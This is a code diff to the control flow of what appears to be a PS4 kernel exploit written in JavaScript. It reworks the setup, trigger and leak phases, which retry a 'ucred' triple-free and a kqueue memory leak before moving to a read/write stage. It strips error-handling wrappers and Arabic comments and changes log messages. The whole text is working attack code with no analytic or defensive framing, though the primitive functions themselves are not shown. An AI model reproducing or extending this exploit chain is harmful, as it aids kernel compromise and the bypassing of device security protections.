@@ -939,75 +939,43 @@ function netctrl_exploit() {
 }
 function exploit_phase_setup() {
   if (exploit_end) return;
-
   let ok = false;
-
   try {
     ok = setup();
   } catch (e) {
     ok = false;
   }
-
   if (!ok) {
     log('Setup failed — aborting.');
     cleanup();
     exploit_end = true;
     return;
   }
-
   exploit_count = 0;
   exploit_end = false;
 
   yield_to_render(exploit_phase_trigger);
 }
 function exploit_phase_trigger() {
-  // وقف لو وصلنا للحد الأقصى
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
-    log('Failed — restart your system');
+    log('Failed-please Restart your ps4 #');
     cleanup();
     return;
   }
-
   exploit_count++;
-
-  let ok = false;
-
-  // حماية بسيطة من أي خطأ غير متوقع
-  try {
-    ok = trigger_ucred_triplefree();
-  } catch (e) {
-    ok = false;
-  }
-
-  // لو المحاولة فشلت — جرّب تاني
-  if (!ok) {
+  if (!trigger_ucred_triplefree()) {
     yield_to_render(exploit_phase_trigger);
     return;
   }
-
-  // لو نجحت — انتقل للمرحلة التالية
   yield_to_render(exploit_phase_leak);
 }
 function exploit_phase_leak() {
-  // حماية من تكرار غير مقصود
-  if (exploit_end) return;
-
-  let ok = false;
-
-  // حماية من أي خطأ غير متوقع
-  try {
-    ok = leak_kqueue_safe();
-  } catch (e) {
-    ok = false;
-  }
-
-  // لو العملية فشلت — أعد المحاولة
-  if (!ok) {
+  log('Leaking .....');
+  var leak_ok = leak_kqueue_safe();
+  if (!leak_ok) {
     yield_to_render(exploit_phase_trigger);
     return;
   }
-
-  // لو نجحت — انتقل للمرحلة التالية
   yield_to_render(exploit_phase_rw);
 }
 function exploit_phase_rw() {
